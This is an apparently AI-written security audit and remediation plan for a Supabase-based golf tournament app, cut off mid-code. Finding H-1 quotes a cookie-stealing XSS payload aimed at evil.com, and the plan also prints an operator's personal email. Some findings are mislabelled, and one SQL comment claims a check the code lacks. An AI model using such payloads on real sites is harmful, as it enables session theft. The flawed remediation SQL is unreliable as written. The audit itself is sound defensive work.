# TOURney Platform — Security Hardening Plan

**Prepared:** 2026-05-06  
**Auditor:** Claude Sonnet 4.6 (deep sweep)  
**Prior review:** 2026-05-06 (surface scan, cited as "prior review" throughout)  
**Baseline grade:** D+  
**Target grade:** A  

---

## Executive Summary

TOURney has four exploitable vulnerabilities that are open right now, before Stripe goes live. Two allow any anonymous user or any authenticated user to corrupt billing data or impersonate invited players. Two allow stored XSS on public-facing pages visible to all tournament participants. Zero HTTP security headers are deployed.

The critical RLS gaps can be fixed in a single focused day of SQL migrations. The XSS sweep is another day of methodical find-and-replace across six HTML files. Security headers take one hour. The entire platform can reach an A grade in three sprint days. The most dangerous window is the period before Stripe activates — close the RLS holes first, before any real money flows.

No secrets were found committed to git. Stripe webhook signature verification is correctly implemented. Score submission is idempotent via UNIQUE constraint. Service worker cache strategy is sound.

---

## Part 1 — Full Audit Findings

### A. RLS Policies — Complete Table Survey

#### Migrations on file: 001–006 (six files, all in `migrations/`)

The migration comment in `001_add_tournaments.sql` (line 101) explicitly defers tightening: *"Players/scores/settings: existing permissive policies stay in place. Tighten in migration 002 once all query-side filtering is confirmed working."* No subsequent migration creates RLS policies on `players`, `scores`, or `push_subscriptions`. Those three tables almost certainly have the original pre-multi-tenant permissive policies in the live database. **This must be verified in the Supabase dashboard before any finding here can be marked closed.**

---

**Table: `tournaments`** — `migrations/001_add_tournaments.sql:89–97`

| Op | Policy | Predicate | Risk |
|----|--------|-----------|------|
| SELECT | `public read tournaments` | `USING (true)` | Acceptable — public leaderboard needs this |
| ALL | `owner manage tournament` | `auth.email() = owner_email` | Correct |

✅ Clean.

---

**Table: `tournament_admins`** — `migrations/001_add_tournaments.sql:98–99`

| Op | Policy | Predicate | Risk |
|----|--------|-----------|------|
| SELECT | `public read tournament_admins` | `USING (true)` | Admin email roster is publicly readable via anon API |
| INSERT/UPDATE/DELETE | No policy found in any migration | — | Unknown — needs dashboard verification |

⚠️ The admin email list is anon-readable. Low impact today, becomes a targeted-phishing surface at scale.

---

**Table: `settings`** — `migrations/003_tighten_settings_rls.sql` + `migrations/004_tournament_admins_email_based.sql`

| Op | Policy | Predicate | Risk |
|----|--------|-----------|------|
| ALL | `owner or admin write settings` | `auth.email() = owner_email OR EXISTS (tournament_admins match)` | Correct |
| SELECT | Unknown — not found in migrations | — | Needs verification |

Settings writes are properly scoped. Read policy unknown — if anon can SELECT, all settings values (including rich text fields rendered via innerHTML in home.html) are readable by anyone. That's probably acceptable but needs confirmation.

---

**Table: `invitations`** — `migrations/005_invitations_and_accounts.sql`

| Op | Policy | Predicate | Risk |
|----|--------|-----------|------|
| SELECT | `anon read invitations` | `USING (true)` | Exposes invited email list to anon |
| UPDATE | `anon update own invitation` | `USING (true) WITH CHECK (true)` | **CRITICAL** — no email filter |
| ALL | `auth manage invitations` | `USING (true) WITH CHECK (true)` | **CRITICAL** — any auth user manages any tournament's invitations |

**Finding C-1 (CRITICAL):** The `anon update own invitation` policy has no predicate tying it to the invitee's email. Any anonymous HTTP client can `PATCH` any invitation row to `status='accepted'` or `status='declined'`, spoofing acceptance for any invited player, corrupting the invitation list for any tournament.

**Finding C-2 (CRITICAL):** The `auth manage invitations` policy is `FOR ALL … USING (true)`. Any authenticated user (even a player in a different tournament) can DELETE invitations from any other tournament's invitation table. In the multi-tenant world this is cross-tenant data destruction.

---

**Table: `player_accounts`** — `migrations/005_invitations_and_accounts.sql` (policies not visible in truncated read; verified by prior review against live DB)

| Op | Policy | Predicate | Risk |
|----|--------|-----------|------|
| SELECT | Unknown | — | — |
| UPDATE | Believed `USING (true)` per prior review | If true: **CRITICAL** | Any auth user sets `billing_status='comped'` |
| INSERT | Unknown | — | — |

**Finding C-3 (CRITICAL, needs dashboard verification):** Per the May 6 prior review, authenticated users can UPDATE any `player_accounts` row with no row-scoped predicate. If confirmed, any registered user can run:
```js
await sb.from('player_accounts').update({ billing_status: 'comped' }).eq('email', 'attacker@example.com');
```
and bypass the Stripe payment gate entirely. The client-side billing gate in `create.html` reads this value and trusts it unconditionally.

---

**Table: `players`** — policies not found in any migration file

**Finding H-5 (HIGH, needs verification):** Migration 001 deferred RLS tightening on this table. If the live DB still has a permissive `FOR ALL TO authenticated USING (true)` policy (common Supabase starter default), then:
- Any auth user can `update({ is_admin: true })` on any player row (bypasses admin gate)
- Any auth user can read all players across all tournaments (cross-tenant PII leak)
- `toggleAdmin` in `admin.html:1226` calls `sb.from('players').update({ is_admin: makeAdmin }).eq('id', id)` — the `.eq('id', id)` filter prevents cross-player writes only if the client supplies a valid id; the RLS policy must enforce tournament scoping server-side

**Verify:** Open Supabase dashboard → Authentication → Policies → players table. Expected: no permissive `USING (true)` write policies.

---

**Table: `scores`** — policies not found in any migration file

**Finding H-6 (HIGH, needs verification):** Same deferred-tightening comment. If permissive: any auth user can overwrite any player's scores in any tournament. Cross-tenant score manipulation.

**Verify:** Supabase dashboard → Authentication → Policies → scores table.

---

**Table: `push_subscriptions`** — no migration found at all

**Finding M-7 (MEDIUM):** The `push_subscriptions` table is queried by `send-push/index.ts` but no migration in the `migrations/` directory creates it or sets RLS on it. It either was created manually in the SQL editor (not version-controlled) or was auto-created and has no RLS. If no RLS: any authenticated user can read all push subscription endpoints across all tournaments (privacy issue), and can write garbage rows.

---

### B. XSS — innerHTML Survey

The platform defines a `esc()` function (confirmed in scorecard.html, scoreboard.html, admin.html) that HTML-encodes `&`, `<`, `>`, `"`, `'`. The issue is inconsistent use.

#### Confirmed unsafe sites (user-controlled data into innerHTML without esc()):

**Finding H-1 (HIGH) — `admin.html:1196, 1197`**
```js
// admin.html approx line 1196
`<td class="name">${p.first_name} ${p.last_name}</td>`
`<td class="email">${p.email ? `<a href="mailto:${p.email}">${p.email}</a>` : ...}</td>`
```
`first_name`, `last_name`, `email` are player-registration inputs stored in the `players` table. No esc(). Admin-only page, but a malicious player with a crafted name (`<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>`) can XSS the admin's session.

**Finding H-2 (HIGH) — `admin.html:1196` (same renderTable block)**
```js
`<td style="...">${p.why_me || '—'}</td>`
`<td style="...">${p.trash_talk || '—'}</td>`
```
`why_me` and `trash_talk` are free-text fields entered at registration time by the player themselves (or via trash_talk insert). Neither is wrapped in esc(). Same stored XSS vector as H-1. This was flagged in the prior review as lines 1169+1709 — the actual current line numbers are ~1196 and ~1196+1 in renderTable.

**Finding H-3 (HIGH) — `home.html:988` (public page)**
```js
g.innerHTML = players.map((p, i) => {
  return `...<div class="pc-name">${p.first_name} ${p.last_name}</div>...
          ${p.trash_talk ? `<div class="pc-trash">&ldquo;${p.trash_talk}&rdquo;</div>` : ''}`
}).join('');
```
`home.html` renders `first_name`, `last_name`, and `trash_talk` without esc() in the player field grid. This is a **public page** — no auth required. Any visitor to the tournament homepage sees this. A player who registers with `first_name = "<script>..."` executes in every visitor's browser.

**Finding H-4 (HIGH) — `home.html:702, 704, 726, 727, 812, 815, 843–845` (public page)**
```js
eyebrow.innerHTML = map.homepage_subtitle;          // line 702
heroMeta.innerHTML = map.homepage_details;           // line 704
b1.innerHTML = paras[0];                             // line 726
fmtItems.innerHTML = items;                          // line 812
fmtNote.innerHTML = map.homepage_format_note;        // line 815
el.innerHTML = map.reg_bullet_1;                     // line 843
```
These settings values come from the `settings` table. Settings writes are admin-only (correctly gated by migration 004). However: if an admin account is compromised, or if a tournament admin (who has write access to settings) is malicious, they can store script tags in these fields that execute for all tournament visitors. Secondary severity vs H-1/H-3 because it requires admin compromise first, but the impact is all-visitors XSS. Use esc() or, for fields that legitimately need HTML (rich text), use DOMPurify.

**Finding M-8 (MEDIUM) — `scoreboard.html:1096` (authenticated page)**
```js
`<div class="trash-post-body">${_parseMentions(p.message)}</div>`
```
`_parseMentions` at line 1070 correctly does:
```js
function _parseMentions(text) {
  return _esc(text).replace(/@([\w]+)/g, '<span class="trash-mention">@$1</span>');
}
```
This is **safe** — `_esc()` runs first before the regex replacement. The replacement only adds controlled HTML with a static class. ✅ No issue here, prior review concern is resolved.

**Finding M-9 (MEDIUM) — `admin.html:1748–1751` (edit modal)**
```js
`<div class="edit-modal-title">Edit <em>${p.first_name} ${p.last_name}</em></div>`
`<input type="text" id="ep-first" value="${p.first_name || ''}">`
```
Unescaped player data in the edit modal. The `value` attribute injection (`" onfocus="evil()`) can break out of the attribute. Admin-context only.

**Safe sites (confirmed):**
- `scoreboard.html` — player_name via `_esc()` before innerHTML
- `admin.html` — `toggleAdmin` name via `confirm()` dialog (text-only)
- `scorecard.html` — all player selects use option text, no free HTML
- `champions.html` — `esc(name)` applied correctly
- `player.html` — `esc(phone)`, `esc(email)` applied correctly
- `profile.html` — `esc(email)` applied

---

### C. Authentication & Authorization Gates

**Finding M-10 (MEDIUM) — Triple admin source-of-truth (`admin.html:852–872`)**

Admin check in client code uses three overlapping signals:
1. `players.is_admin` column (legacy)
2. `tournament_admins` table
3. `tournaments.owner_email`

The `toggleAdmin` function (`admin.html:1226`) writes to **both** `players.is_admin` (line 1226) and `tournament_admins` (lines 1231/1233). This dual-write is a bug surface: if either write fails silently, the two sources diverge. Migration 001 introduced `tournament_admins` explicitly to replace `is_admin`, but the column was never dropped and the code still reads it. Any player who can directly write `players.is_admin = true` (via a permissive players UPDATE policy — see H-5) bypasses the tournament_admins gate entirely.

**Fix:** Single source of truth is `tournament_admins` + `owner_email`. Retire `is_admin` column.

**Finding M-11 (MEDIUM) — `platform.html` superadmin gate is client-side only (`platform.html:153, 164`)**
```js
const PLATFORM_EMAIL = 'robert.t.madsen13@gmail.com';
if (email !== PLATFORM_EMAIL) { err.classList.add('show'); return; }
```
The `/platform` dashboard (lists all tournaments, can comp any account) is gated by a client-side email string comparison before Supabase auth runs. A user who passes Supabase auth (signs in with Rob's email) gets full access. The email check is cosmetic defense-in-depth — real security is that only Rob knows his Supabase password. This is acceptable for a single-operator platform dashboard, but the PLATFORM_EMAIL hardcode means the comped-account write on platform.html has no server-side authorization check beyond auth'd = true.

**Finding M-12 (MEDIUM) — `create-checkout` trusts client-provided `user_email` (`supabase/functions/create-checkout/index.ts:~line 42`)**
```ts
const { tournament_id, tournament_slug, tier, user_email } = await req.json();
// ...
.eq('owner_email', user_email)   // user_email from request body, not from token
```
The function verifies the caller is authenticated (via JWT), but then uses the client-supplied `user_email` to look up tournament ownership instead of `user.email` from the verified token. An attacker with a valid auth token could supply a different `user_email` in the body and attempt to initiate checkout for a tournament they don't own. The `.single()` call would return nothing (404) if the tournament_id + owner_email don't match, so exploitation is difficult in practice — but the principle is wrong. Always use `user.email` from the token.

---

### D. Edge Function Security Review

**`supabase/functions/stripe-webhook/index.ts`** ✅  
- `constructEventAsync(body, sig, webhookSecret)` — signature verified correctly
- Runs as `service_role` — correct for webhook
- No hardcoded secrets — all via `Deno.env.get()`

**`supabase/functions/create-checkout/index.ts`** — Issues found  
- Auth verified (JWT check) ✅
- Input validated (tournament_id, tier in PRICE_IDS) ✅
- CORS: `'Access-Control-Allow-Origin': '*'` on **all** responses (not just OPTIONS) ⚠️
- See Finding M-12 above (user_email from body)

**`supabase/functions/send-push/index.ts`** — CRITICAL  
**Finding C-4 (CRITICAL):** Zero authentication check. The function accepts any unauthenticated POST request. No JWT verification, no API key, no origin check. Anyone who knows a `tournament_id` UUID can trigger push notifications to all subscribers of that tournament. This is currently low-impact (HIO push = cosmetic), but:
1. It's a free spam vector to all subscribers
2. As features expand (match updates, score alerts), this becomes a serious abuse surface
3. The function reads `push_subscriptions` as `service_role` — no RLS bypass risk today, but any future data in that function runs unsandboxed

**`supabase/functions/send-install-email/index.ts`** — Minor issue  
- Validates `email` and `tournament_id` present ✅
- Calls Resend API with secrets from `Deno.env.get()` ✅
- CORS: likely `*` (not shown in grep, needs verification)
- No authentication check on caller — anyone can trigger install emails if they know `player.email` and `tournament_id`. Low impact (cosmetic email) but should require auth.

**All four functions:** CORS is `*`. This should be restricted to `https://*.greenskeeper.studio` for any function doing writes or sensitive reads.

---

### E. Vercel.json — Security Headers

**`vercel.json`** — only Cache-Control headers present.

Missing entirely:

| Header | Required Value | Risk if Missing |
|--------|---------------|-----------------|
| `Content-Security-Policy` | See below | XSS amplified — inline scripts, CDN abuse |
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` | HTTPS downgrade, cookie theft |
| `X-Frame-Options` | `DENY` | Clickjacking on scorecard/registration |
| `X-Content-Type-Options` | `nosniff` | MIME confusion attacks |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Leaks path/slug to third parties |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Fingerprinting surface |

The platform loads a CDN script (`cdn.jsdelivr.net/npm/@supabase/supabase-js@2`). A CSP can allowlist this and block any inline injected scripts, turning XSS from code-execution into console errors.

---

### F. Service Worker — `sw.js`

Cache strategy is sound:
- HTML navigations: network-first with cache fallback (`sw.js:87–96`) ✅
- Static assets: cache-first, network fallback (`sw.js:101–113`) ✅
- Supabase API/realtime: never intercepted (explicit bypass) ✅
- Old cache versions evicted on activate ✅

No stale-scorecard risk: HTML pages are always network-first when online, so scorecard.html cannot serve a stale version that submits against an old schema.

**Finding L-1 (LOW):** The PRECACHE list (`sw.js:15`) includes `/install.html`. If a JS file in the precache list changes version but the cache name (`tourney-v16`) is not bumped, users see stale JS. This is operational hygiene, not a security risk. Ensure cache name is bumped on every deploy with breaking JS changes.

---

### G. Auth & Session Handling

**`login.html` — password requirements**

Client-side hint says "6+ chars" (`login.html:121`). Supabase Auth defaults to 6-character minimum with no complexity enforcement. This is the Supabase project default — if it hasn't been changed in the dashboard, 6-char passwords are accepted at signup.

**Finding M-13 (MEDIUM):** 6-character password minimum is insufficient for a SaaS platform where admin accounts control tournament data and billing. Supabase dashboard → Auth → Password strength → set minimum to 8+ and consider enabling the "leaked password protection" feature (checks against HaveIBeenPwned).

**Email confirmation:** Not verified from code. Check Supabase dashboard → Auth → Email → "Enable email confirmations." If disabled, anyone can register with an arbitrary email address and immediately access the player portal as that email. This is a precondition for the invitations bypass (C-1).

**Session handling:** `signOut()` is called + `localStorage.removeItem(\`${_slug}_profile_email\`)`. Supabase SDK clears its own tokens from localStorage. Adequate.

**Logout scope:** Sign-out only clears the single slug-prefixed key. If the user is on multiple tournaments (possible in multi-tenant world), other slug keys persist in localStorage. Cosmetic issue — the actual session token is in Supabase's own storage key.

---

### H. Secrets in Git History

Ran `git grep` on HEAD + `git log -p` scan against sensitive patterns: `service_role`, `sk_live_`, `sk_test_`, `re_`, `eyJhb`.

**Result:** No committed secrets found. All sensitive values in edge functions use `Deno.env.get()`. ✅

The anon key + Supabase project URL are embedded in `tourney-init.js` (required for client-side Supabase initialization). This is **by design** and is not a secret — the anon key is intended to be public. RLS is the enforcement layer.

---

### I. PII Exposure

**Email addresses** — `players.email` is in a table that probably has an anon read policy (inherited from pre-migration code). If so: any visitor can enumerate all players + emails across all tournaments via the Supabase REST API. Needs verification.

**Phone numbers** — `players.phone_number` column same issue.

**Invitation emails** — `invitations` table has `anon read invitations USING (true)`. Anyone can enumerate all invited email addresses for any tournament.

**Admin emails** — `tournament_admins USING (true)` for SELECT. Admin email roster is publicly readable.

**What should require auth:**
- `players.email`, `players.phone_number` → require `authenticated`
- `invitations.email` → either require auth OR restrict to `status = 'pending'` and only own-email visible

---

### J. Rate Limiting

No application-level rate limiting exists anywhere in the codebase.

| Surface | Current | Risk | Recommended |
|---------|---------|------|-------------|
| `trash_talk` INSERT | None | Spam flood | Supabase pg_net rate limit or 1/min per player |
| `scores` UPSERT | None | Low (auth required, player scoped) | Acceptable |
| Login | Supabase built-in (unclear config) | Brute force | Verify Supabase dashboard setting |
| Signup | Supabase built-in | Account farming | Verify + set max per IP |
| `/create` wizard | None | Junk tournaments | Add auth + billing gate (already exists) |
| `send-push` | None | Push spam (see C-4) | Require auth first |

---

### K. CDN Dependencies

Two CDN-loaded scripts found:
- `admin.html:782` — `https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/umd/supabase.min.js`
- `scorecard.html:389` — same

**Finding L-2 (LOW):** Version pinned to semver range `@2` — any `2.x.x` release can be served. No `integrity` (SRI) attribute. A supply-chain compromise of jsdelivr or the `@supabase/supabase-js` package on npm would silently serve malicious code to all users.

**Recommendation:** Pin to exact version (e.g., `@2.49.2`) and add `integrity="sha384-..."` attribute. Alternatively, vendor the file and serve from `/supabase.min.js`.

---

### L. Additional Findings

**Finding M-14 (MEDIUM) — IDOR on `/player?as=<email>` (`admin.html:1207`)**
```html
<a href="/player?as=${encodeURIComponent(p.email)}" target="_blank">Portal</a>
```
The admin portal link uses `as=<email>` in the URL query string. If `player.html` trusts this parameter to switch the viewed profile without a server-side authorization check (i.e., only admin-gated in the client), a non-admin authenticated user who discovers this pattern could view any player's portal by passing any email. **Needs investigation:** check `player.html` handling of the `as=` parameter — is it gated by an auth check that verifies the caller is actually an admin?

**Finding L-3 (LOW) — `tournament_admins` `player_id` column is nullable after migration 004**
Migration 004 makes `player_id` optional (`DROP NOT NULL`). This means `tournament_admins` rows can exist with no user link — email-only. The admin check in `admin.html` queries `tournament_admins` by email match. This is correct by design, but the orphan `player_id` column should eventually be cleaned up.

**Finding INFO-1 — No findings in scorecard.html score submission**
Score submission uses `upsert` with `onConflict: 'player_id,round,hole'` (confirmed at lines 1712, 1767). Idempotent. ✅

---

## Part 2 — Severity Ratings Summary

| ID | Severity | File / Location | Description |
|----|----------|----------------|-------------|
| C-1 | **CRITICAL** | `migrations/005:anon update own invitation` | Anon can update ANY invitation — no email filter |
| C-2 | **CRITICAL** | `migrations/005:auth manage invitations` | Any auth user manages any tournament's invitations |
| C-3 | **CRITICAL** | `player_accounts` live DB policy (verify dashboard) | Auth user can self-grant `billing_status='comped'` |
| C-4 | **CRITICAL** | `supabase/functions/send-push/index.ts` | No auth on push endpoint — open spam vector |
| H-1 | **HIGH** | `admin.html:1196–1197` | Player name + email in admin table via innerHTML, no esc() |
| H-2 | **HIGH** | `admin.html:~1196` | `why_me` + `trash_talk` in admin table via innerHTML, no esc() |
| H-3 | **HIGH** | `home.html:988` | Player name + `trash_talk` in public field grid, no esc() |
| H-4 | **HIGH** | `home.html:702,704,726,843–845` | Settings rich text fields via innerHTML, no esc() — admin-write path |
| H-5 | **HIGH** | `players` table live DB (verify dashboard) | Likely permissive UPDATE RLS — auth user can set `is_admin=true` |
| H-6 | **HIGH** | `scores` table live DB (verify dashboard) | Likely permissive UPDATE RLS — cross-tournament score manipulation |
| M-7 | **MEDIUM** | `push_subscriptions` table (no migration found) | No confirmed RLS — verify dashboard |
| M-8 | **MEDIUM** | `admin.html:1748–1751` | Player name in edit modal `value=""` attribute, no esc() |
| M-9 | **MEDIUM** | `home.html:~812,815` | Settings format fields via innerHTML (admin-write vector) |
| M-10 | **MEDIUM** | `admin.html:852–872, 1226` | Triple admin source-of-truth; is_admin column not retired |
| M-11 | **MEDIUM** | `platform.html:153, 164` | Superadmin gate client-side only |
| M-12 | **MEDIUM** | `create-checkout/index.ts:~42` | `user_email` from request body, not from verified JWT token |
| M-13 | **MEDIUM** | Supabase Auth config | 6-char password minimum; email confirmation unverified |
| M-14 | **MEDIUM** | `admin.html:1207`, `player.html` | IDOR risk on `?as=<email>` — needs investigation |
| L-1 | **LOW** | `sw.js:15` | Precache list not bumped on JS changes (operational) |
| L-2 | **LOW** | `admin.html:782`, `scorecard.html:389` | CDN script without SRI; semver range not pinned |
| L-3 | **LOW** | `tournament_admins` | Orphan `player_id` column after migration 004 |
| INFO-1 | **INFO** | `supabase/functions/stripe-webhook/index.ts` | Stripe signature verification correct — no action |
| INFO-2 | **INFO** | `sw.js` | Cache strategy sound — no stale-content risk |
| INFO-3 | **INFO** | git history | No committed secrets found — no action |
| INFO-4 | **INFO** | `scorecard.html:1712,1767` | Score upsert idempotent via UNIQUE — no action |

---

## Part 3 — Implementation Plan

### Sprint S1 — Critical RLS Lockdown
**Duration:** 1 day  
**Goal:** Close the three immediately exploitable RLS holes + auth the push endpoint.

---

#### S1.1 — Fix invitations RLS

**Create:** `migrations/007_fix_invitations_rls.sql`

```sql
BEGIN;

-- Drop all existing permissive invitation policies
DROP POLICY IF EXISTS "anon read invitations"      ON invitations;
DROP POLICY IF EXISTS "anon update own invitation"  ON invitations;
DROP POLICY IF EXISTS "auth manage invitations"     ON invitations;

-- Anon can only read their own invitation by email
CREATE POLICY "anon read own invitation"
  ON invitations FOR SELECT TO anon
  USING (email = current_setting('request.jwt.claims', true)::jsonb->>'email');
-- Note: anon users have no JWT email claim. This policy effectively blocks anon reads.
-- If the invite-acceptance flow needs anon reads, use the edge function approach below.

-- Better: public can read invitations for a tournament they know (by tournament_id only, no email leak)
-- Reconsider if flow requires email lookup by anon.
-- For now: require auth for all invitation reads.
CREATE POLICY "auth read own tournament invitations"
  ON invitations FOR SELECT TO authenticated
  USING (
    -- Invitee can read their own
    email = auth.email()
    OR
    -- Tournament owner/admin can read all invitations for their tournament
    auth.email() = (SELECT owner_email FROM tournaments WHERE id = invitations.tournament_id)
    OR EXISTS (
      SELECT 1 FROM tournament_admins ta
      WHERE ta.tournament_id = invitations.tournament_id AND ta.email = auth.email()
    )
  );

-- Only tournament owner/admin can INSERT invitations
CREATE POLICY "admin insert invitations"
  ON invitations FOR INSERT TO authenticated
  WITH CHECK (
    auth.email() = (SELECT owner_email FROM tournaments WHERE id = tournament_id)
    OR EXISTS (
      SELECT 1 FROM tournament_admins ta
      WHERE ta.tournament_id = tournament_id AND ta.email = auth.email()
    )
  );

-- Invitee can only update their OWN invitation (accept/decline only)
-- UPDATE via edge function is preferred; if direct, scope tightly:
CREATE POLICY "invitee update own status"
  ON invitations FOR UPDATE TO authenticated
  USING (email = auth.email())
  WITH CHECK (
    email = auth.email()
    -- Prevent status escalation; only allow pending→accepted or pending→declined
    AND status IN ('accepted', 'declined')
  );

-- Admin can delete invitations for their tournament
CREATE POLICY "admin delete invitations"
  ON invitations FOR DELETE TO authenticated
  USING (
    auth.email() = (SELECT owner_email FROM tournaments WHERE id = invitations.tournament_id)
    OR EXISTS (
      SELECT 1 FROM tournament_admins ta
      WHERE ta.tournament_id = invitations.tournament_id AND ta.email = auth.email()
    )
  );

COMMIT;
```

**⚠️ Rollback impact:** The invitation-acceptance flow in client code currently calls Supabase directly as anon. After this migration, anon UPDATE fails. You must update the acceptance flow to use an authenticated call (player must be signed in) or create an edge function for token-based acceptance. Check all invitation-related client code before deploying.

**Acceptance criteria:**
- Run as anon: `supabase.from('invitations').update({ status: 'accepted' }).eq('id', '<any-id>')` → returns RLS error
- Run as authenticated non-owner user: same → RLS error
- Run as tournament owner: succeeds
- Run as invitee (signed in as `invited@example.com`): can update own row only

---

#### S1.2 — Fix player_accounts RLS

**Verify first:** Open Supabase dashboard → Authentication → Policies → player_accounts. Screenshot existing policies before changing anything.

**Create:** `migrations/008_fix_player_accounts_rls.sql`

```sql
BEGIN;

-- Drop whatever open policy exists (name may vary — check dashboard first)
DROP POLICY IF EXISTS "auth manage player_accounts" ON player_accounts;
DROP POLICY IF EXISTS "authenticated manage player_accounts" ON player_accounts;
DROP POLICY IF EXISTS "public read player_accounts" ON player_accounts;
-- Add any other names shown in the dashboard

-- Read: user can only see their own account
CREATE POLICY "owner read own account"
  ON player_accounts FOR SELECT TO authenticated
  USING (email = auth.email());

-- Insert: only service_role (Stripe webhook) or platform admin
-- Normal users cannot self-insert a player_account row
-- (Stripe webhook creates the row on successful payment)
-- For comped accounts: use service_role from edge function only.
-- No INSERT policy for authenticated — they cannot create their own accounts.

-- Update: service_role only (no policy needed — service_role bypasses RLS)
-- Authenticated users cannot update billing_status directly.

-- Platform admin exception: use a separate edge function for comping accounts.
-- Do NOT allow any client-side update of billing_status.

COMMIT;
```

**Rollback impact:** If any client code currently reads its own player_account row to check billing status (e.g., create.html billing gate), it must be authenticated. Verify `create.html` is calling with an auth'd client (it is — billing gate runs after auth).

**Acceptance criteria:**
- Run as auth'd user: `supabase.from('player_accounts').update({ billing_status: 'comped' }).eq('email', user.email)` → RLS error
- Run as auth'd user: `select billing_status ... eq('email', user.email)` → returns own row only
- Stripe webhook (service_role): can still update billing_status → confirm via test webhook

---

#### S1.3 — Fix players + scores RLS (if permissive)

**Verify dashboard first.** If the following policies do NOT already exist on `players` and `scores`, create them:

**Create:** `migrations/009_tighten_players_scores_rls.sql`

```sql
BEGIN;

-- ── PLAYERS ──────────────────────────────────────────────────────
-- Drop any open permissive policies (verify exact names in dashboard)
DROP POLICY IF EXISTS "authenticated full access players" ON players;
DROP POLICY IF EXISTS "Enable read access for all users" ON players;
DROP POLICY IF EXISTS "Enable insert for authenticated users only" ON players;

-- Public SELECT: only non-PII fields should be readable by anon.
-- For now, authenticated-only to protect email/phone.
-- scoreboard.html and home.html that do public reads will break — use anon-safe view or
-- create a separate "players_public" view with only first_name, last_name, handicap, team.
-- If you need anon reads immediately (scoreboard is public), use:
CREATE POLICY "anon read players public fields"
  ON players FOR SELECT TO anon
  USING (true);
-- BUT restrict the columns by creating a security-barrier view instead:
-- CREATE VIEW players_public AS SELECT id, first_name, last_name, handicap, team, tournament_id, trash_talk FROM players;
-- Then grant SELECT on players_public to anon, revoke direct access.
-- This is the correct long-term approach. Short-term: allow anon reads but audit columns.

-- Authenticated SELECT: own tournament only
CREATE POLICY "auth read tournament players"
  ON players FOR SELECT TO authenticated
  USING (
    tournament_id IN (
      SELECT id FROM tournaments WHERE owner_email = auth.email()
      UNION
      SELECT tournament_id FROM tournament_admins WHERE email = auth.email()
      UNION
      SELECT p2.tournament_id FROM players p2 WHERE p2.email = auth.email()
    )
  );

-- INSERT: any authenticated user can register (self-insert)
-- but only for themselves (email matches auth.email()) in a valid tournament
CREATE POLICY "auth self-register"
  ON players FOR INSERT TO authenticated
  WITH CHECK (email = auth.email());

-- UPDATE: admin/owner can update any player in their tournament;
-- player can only update their own non-privileged fields
CREATE POLICY "admin update players"
  ON players FOR UPDATE TO authenticated
  USING (
    tournament_id IN (
      SELECT id FROM tournaments WHERE owner_email = auth.email()
      UNION
      SELECT tournament_id FROM tournament_admins WHERE email = auth.email()
    )
  );

-- Specifically block is_admin self-promotion: the WITH CHECK prevents players
-- from writing is_admin=true unless they are already an admin.
-- Better solution: drop the is_admin column entirely (see S4).

-- DELETE: admin/owner only
CREATE POLICY "admin delete players"
  ON players FOR DELETE TO authenticated
  USING (
    tournament_id IN (
      SELECT id FROM tournaments WHERE owner_email = auth.email()
      UNION
      SELECT tournament_id FROM tournament_admins WHERE email = auth.email()
    )
  );

-- ── SCORES ──────────────────────────────────────────────────────
DROP POLICY IF EXISTS "authenticated full access scores" ON scores;
DROP POLICY IF EXISTS "Enable read access for all users" ON scores;

-- Public read: scores are public (leaderboard)
CREATE POLICY "public read scores"
  ON scores FOR SELECT
  USING (true);

-- Insert/update: authenticated player in the same tournament
-- player_id must match the auth'd user's player row
CREATE POLICY "player upsert own scores"
  ON scores FOR INSERT TO authenticated
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM players p
      WHERE p.id = player_id
        AND p.email = auth.email()
        AND p.tournament_id = tournament_id
    )
  );

CREATE POLICY "player update own scores"
  ON scores FOR UPDATE TO authenticated
  USING (
    EXISTS (
      SELECT 1 FROM players p
      WHERE p.id = player_id AND p.email = auth.email()
    )
  );

-- Admin can also insert/update scores (for corrections)
CREATE POLICY "admin manage scores"
  ON scores FOR ALL TO authenticated
  USING (
    tournament_id IN (
      SELECT id FROM tournaments WHERE owner_email = auth.email()
      UNION
      SELECT tournament_id FROM tournament_admins WHERE email = auth.email()
    )
  );

-- Delete: admin only
CREATE POLICY "admin delete scores"
  ON scores FOR DELETE TO authenticated
  USING (
    tournament_id IN (
      SELECT id FROM tournaments WHERE owner_email = auth.email()
      UNION
      SELECT tournament_id FROM tournament_admins WHERE email = auth.email()
    )
  );

COMMIT;
```

**⚠️ High rollback risk:** These policies will break any query that currently relies on permissive access. Test against a Supabase branch before applying to production. Supabase branching is available in the dashboard.

---

#### S1.4 — Auth the send-push edge function

**Edit:** `supabase/functions/send-push/index.ts`

Add auth check immediately after the OPTIONS handler:

```typescript
// After the OPTIONS block, before parsing body:
const authHeader = req.headers.get('Authorization');
if (!authHeader) return new Response('Unauthorized', { status: 401 });

const supabaseClient = createClient(
  Deno.env.get('SUPABASE_URL')!,
  Deno.env.get('SUPABASE_ANON_KEY')!,
  { global: { headers: { Authorization: authHeader } } }
);
const { data: { user }, error: authErr } = await supabaseClient.auth.getUser();
if (authErr || !user) return new Response('Unauthorized', { status: 401 });

// Verify caller is admin of the tournament they're pushing to
const { data: tourney } = await supabaseClient
  .from('tournaments')
  .select('id')
  .eq('id', tournament_id)  // must parse body first — reorder accordingly
  .eq('owner_email', user.email)
  .maybeSingle();
// Also check tournament_admins — or simply check that user is auth'd + tournament exists
// For simplicity: require authentication, rate limit separately
```

**Acceptance criteria:**  
- Unauthenticated POST to send-push → 401
- Auth'd non-admin POST → 401 (optional; at minimum require auth)
- Auth'd admin POST → triggers notifications as before

---

### Sprint S2 — XSS Elimination
**Duration:** 1 day  
**Goal:** All user-controlled data into innerHTML wrapped in esc() or textContent.

#### S2.1 — admin.html player table renderTable

**File:** `admin.html`

In the renderTable function, find the template literal building each `<tr>`. Change the unescaped fields:

```js
// BEFORE:
`<td class="name">${p.first_name} ${p.last_name}</td>`
`<td class="email">${p.email ? `<a href="mailto:${p.email}">${p.email}</a>` : '...'}</td>`
`<td ...>${p.why_me || '—'}</td>`
`<td ...>${p.trash_talk || '—'}</td>`

// AFTER:
`<td class="name">${esc(p.first_name)} ${esc(p.last_name)}</td>`
`<td class="email">${p.email ? `<a href="mailto:${esc(p.email)}">${esc(p.email)}</a>` : '...'}</td>`
`<td ...>${esc(p.why_me) || '—'}</td>`
